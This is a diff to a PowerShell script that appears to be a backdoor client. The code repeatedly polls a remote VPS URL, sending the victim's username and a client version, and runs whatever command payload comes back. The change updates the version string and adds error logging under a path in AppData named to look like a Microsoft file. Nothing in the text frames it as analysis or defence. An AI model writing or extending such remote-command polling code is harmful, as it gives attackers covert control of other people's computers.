@@ -27,7 +27,7 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "205032f"
+$SCRIPT_VERSION = "e038283"
 $clientVersion = $SCRIPT_VERSION
 
 function Execute-CommandPayload ($r) {
@@ -127,14 +127,22 @@ try {
       }
     }
     catch {
+      $logFile = "$env:APPDATA\Microsoft\run\run_error.log"
+      $errText = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [WS Error]: $($_.Exception.ToString())"
+      Add-Content -Path $logFile -Value $errText -ErrorAction SilentlyContinue
+
       try {
         $u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser) + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
         $r = Invoke-RestMethod -Method Get -Uri (New-Object System.Uri($u)) -TimeoutSec 5
         Execute-CommandPayload $r
       }
-      catch {}
+      catch {
+        $pollErrText = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [Poll Error]: $($_.Exception.ToString())"
+        Add-Content -Path $logFile -Value $pollErrText -ErrorAction SilentlyContinue
+      }
       Start-Sleep -Seconds 3
     }
+
   }
 
 
